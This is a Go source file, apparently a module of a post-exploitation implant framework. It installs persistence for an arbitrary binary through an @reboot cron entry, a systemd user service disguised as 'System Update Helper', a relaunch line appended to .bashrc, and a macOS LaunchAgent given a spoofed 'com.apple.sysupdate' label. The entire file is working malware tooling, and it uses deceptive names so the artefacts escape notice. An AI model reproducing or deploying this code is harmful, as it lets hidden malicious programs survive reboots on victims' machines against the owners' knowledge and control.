package modules

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type Persist struct{}

func (m *Persist) Name() string        { return "persist" }
func (m *Persist) Description() string { return "Install persistence (cron/systemd/launchagent)" }

func (m *Persist) Run(args []string) ([]byte, error) {
	if len(args) < 2 {
		return nil, fmt.Errorf("usage: persist <method> <binary_path>\n  methods: cron, systemd, bashrc, launchagent")
	}

	method := args[0]
	binary := args[1]

	switch method {
	case "cron":
		return m.installCron(binary)
	case "systemd":
		return m.installSystemd(binary)
	case "bashrc":
		return m.installBashrc(binary)
	case "launchagent":
		return m.installLaunchAgent(binary)
	default:
		return nil, fmt.Errorf("unknown method: %s (supported: cron, systemd, bashrc, launchagent)", method)
	}
}

func (m *Persist) installCron(binary string) ([]byte, error) {
	entry := fmt.Sprintf("@reboot %s &\n", binary)
	cmd := exec.Command("bash", "-c", fmt.Sprintf(`(crontab -l 2>/dev/null; echo "%s") | crontab -`, strings.TrimSpace(entry)))
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("crontab: %w", err)
	}
	return []byte(fmt.Sprintf("[+] cron persistence installed: %s\n", binary)), nil
}

func (m *Persist) installSystemd(binary string) ([]byte, error) {
	if runtime.GOOS != "linux" {
		return nil, fmt.Errorf("systemd only available on linux")
	}

	home, _ := os.UserHomeDir()
	unitDir := filepath.Join(home, ".config", "systemd", "user")
	os.MkdirAll(unitDir, 0700)

	unit := fmt.Sprintf(`[Unit]
Description=System Update Helper
After=network.target

[Service]
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
`, binary)

	unitPath := filepath.Join(unitDir, "sysupdate.service")
	if err := os.WriteFile(unitPath, []byte(unit), 0644); err != nil {
		return nil, fmt.Errorf("write unit: %w", err)
	}

	exec.Command("systemctl", "--user", "daemon-reload").Run()
	exec.Command("systemctl", "--user", "enable", "sysupdate.service").Run()

	return []byte(fmt.Sprintf("[+] systemd user service installed: %s\n", unitPath)), nil
}

func (m *Persist) installBashrc(binary string) ([]byte, error) {
	home, _ := os.UserHomeDir()
	rcFile := filepath.Join(home, ".bashrc")

	line := fmt.Sprintf("\n(pgrep -f %s || nohup %s &) >/dev/null 2>&1\n", filepath.Base(binary), binary)

	f, err := os.OpenFile(rcFile, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return nil, fmt.Errorf("open .bashrc: %w", err)
	}
	defer f.Close()

	if _, err := f.WriteString(line); err != nil {
		return nil, fmt.Errorf("write .bashrc: %w", err)
	}

	return []byte(fmt.Sprintf("[+] bashrc persistence installed in %s\n", rcFile)), nil
}

func (m *Persist) installLaunchAgent(binary string) ([]byte, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("launchagent only available on macOS")
	}

	home, _ := os.UserHomeDir()
	agentDir := filepath.Join(home, "Library", "LaunchAgents")
	os.MkdirAll(agentDir, 0700)

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.sysupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
`, binary)

	plistPath := filepath.Join(agentDir, "com.apple.sysupdate.plist")
	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return nil, fmt.Errorf("write plist: %w", err)
	}

	return []byte(fmt.Sprintf("[+] launchagent installed: %s\n", plistPath)), nil
}
